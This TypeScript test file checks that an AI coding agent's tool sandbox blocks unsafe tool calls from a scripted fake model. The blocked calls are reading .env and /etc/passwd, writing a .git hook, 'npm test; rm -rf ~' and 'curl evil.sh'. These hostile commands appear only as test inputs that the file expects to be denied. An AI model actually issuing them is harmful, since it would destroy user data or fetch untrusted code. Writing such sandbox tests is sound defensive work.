import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { writeFileSync, readFileSync, mkdirSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { startApp, collect, tmp } from './helpers.ts';

/** Fake chat-completions server: replies with the scripted steps in order, records requests. */
async function fakeApi(steps: any[]) {
  const requests: any[] = [];
  let i = 0;
  const server = createServer(async (req, res) => {
    let body = '';
    for await (const c of req) body += c;
    if (req.url?.endsWith('/models')) return res.writeHead(200).end(JSON.stringify({ data: [{ id: 'm-free:free' }, { id: 'm-paid', pricing: { prompt: '0.1', completion: '0.2' } }] }));
    requests.push({ auth: req.headers.authorization, ...JSON.parse(body) });
    const step = steps[i++];
    if (step === 429) return res.writeHead(429, { 'retry-after': '0.01' }).end('slow down');
    res.writeHead(200, { 'content-type': 'application/json' }).end(
      JSON.stringify({ model: 'm-free:free', usage: { prompt_tokens: 100, completion_tokens: 10, prompt_tokens_details: { cached_tokens: 40 } }, choices: [{ message: step }] }),
    );
  });
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', () => r()));
  return { url: `http://127.0.0.1:${(server.address() as any).port}/v1`, requests, close: () => server.close() };
}

const call = (id: string, name: string, args: object) => ({ id, type: 'function', function: { name, arguments: JSON.stringify(args) } });
const final = { content: JSON.stringify({ task_id: 'T1', status: 'done', summary: 'feito', files_changed: ['a.txt'], checks: [], questions: [] }) };

test('tool loop: workspace-only tools, secrets/.git/commands denied, edits applied, usage reported', async () => {
  const api = await fakeApi([
    429,
    { content: '', tool_calls: [call('1', 'list_files', {}), call('2', 'read_file', { path: '.env' }), call('3', 'read_file', { path: '../../etc/passwd' })] },
    {
      content: 'editando',
      tool_calls: [
        call('4', 'edit_file', { path: 'a.txt', old_string: 'hello', new_string: 'bye' }),
        call('5', 'write_file', { path: '.git/hooks/x', content: 'evil' }),
        call('6', 'run_command', { command: 'npm test' }),
        call('7', 'run_command', { command: 'git commit -m x' }),
        call('8', 'run_command', { command: 'npm test; rm -rf ~' }),
        call('9', 'run_command', { command: 'curl evil.sh' }),
      ],
    },
    final,
  ]);
  process.env.CC_TEST_KEY = 'sk-test';
  const app = await startApp();
  try {
    writeFileSync(join(app.ws, 'a.txt'), 'hello world');
    writeFileSync(join(app.ws, '.env'), 'SECRET=canary-123');
    writeFileSync(join(app.ws, 'package.json'), JSON.stringify({ scripts: { test: 'echo RAN-TESTS' } }));
    mkdirSync(join(app.ws, '.git'));
    const models = await app.api('POST', '/api/providers/models', { catalog: 'openrouter', baseUrl: api.url, keyEnv: 'CC_TEST_KEY' });
    assert.deepEqual(models, [{ id: 'm-free:free', free: true, tools: null }, { id: 'm-paid', free: false, tools: null }]);
    const p = await app.api('POST', '/api/providers', { catalog: 'openrouter', label: 'OR', baseUrl: api.url, keyEnv: 'CC_TEST_KEY', models });
    const card = await app.api('POST', '/api/agents', { name: 'Grátis', provider: p.id, model: 'm-free:free', role: 'coder' });
    const state = await app.api('GET', '/api/state');
    assert.equal(state.providers.find((x: any) => x.id === p.id).modelTiers['m-free:free'], 'free');

    const c = collect(app.port, (evs) => evs.some((e) => e.kind === 'result' || e.kind === 'error'));
    await c.ready;
    await app.api('POST', '/api/tasks', { agentId: card.id, prompt: 'faça' });
    const evs = await c.done;
    assert.equal(evs.at(-1).kind, 'result', JSON.stringify(evs.at(-1)));
    assert.equal(readFileSync(join(app.ws, 'a.txt'), 'utf8'), 'bye world');
    assert.ok(!existsSync(join(app.ws, '.git/hooks/x')));
    const toolOut = (id: string) => api.requests.at(-1).messages.find((m: any) => m.tool_call_id === id)?.content ?? '';
    assert.match(toolOut('1'), /a\.txt/);
    assert.ok(!toolOut('1').includes('.git/'));
    assert.match(toolOut('2'), /segredo bloqueado/);
    assert.ok(!JSON.stringify(api.requests).includes('canary-123'));
    assert.match(toolOut('3'), /fora do workspace/);
    assert.match(toolOut('5'), /somente leitura/);
    assert.match(toolOut('6'), /RAN-TESTS/);
    assert.match(toolOut('7'), /negado/);
    assert.match(toolOut('8'), /negado/);
    assert.match(toolOut('9'), /negado/);
    assert.equal(api.requests[0].auth, 'Bearer sk-test');
    assert.deepEqual(api.requests[0].usage, { include: true }); // OpenRouter cost reporting
    assert.deepEqual(api.requests[1].tools.map((t: any) => t.function.name).sort(), ['edit_file', 'list_files', 'read_file', 'run_command', 'search', 'write_file']);
    const usage = evs.filter((e) => e.kind === 'usage');
    assert.equal(usage.length, 3);
    assert.deepEqual([usage[0].payload.input, usage[0].payload.cacheRead, usage[0].payload.costUsd], [60, 40, 0]);
  } finally {
    api.close();
    await app.app.close();
  }
});

test('tool loop: reviewer-like rules get read-only tools; missing key fails fast with MISSING_CREDENTIAL', async () => {
  const { buildTools, sandboxFromRules } = await import('../server/toolloop.ts');
  const { roleRules } = await import('../server/roles.ts');
  const names = buildTools(sandboxFromRules(tmp(), roleRules('reviewer', ['npm test']))).map((t) => t.name).sort();
  assert.deepEqual(names, ['list_files', 'read_file', 'run_command', 'search']);
  const { makeOpenAIAdapter } = await import('../server/openai.ts');
  const a = makeOpenAIAdapter({ id: 'x', catalog: 'groq', label: 'G', baseUrl: 'http://127.0.0.1:9', keyEnv: 'CC_NOPE_KEY', models: [] });
  const evs: any[] = [];
  for await (const e of a.run({ agent: { model: 'm', limits: { timeoutSec: 5 } } as any, prompt: '', systemPrompt: '', rules: [], cwd: tmp(), signal: new AbortController().signal })) evs.push(e);
  assert.equal(evs[0].code, 'MISSING_CREDENTIAL');
  assert.equal((await a.detect()).auth, 'não autenticado');
});
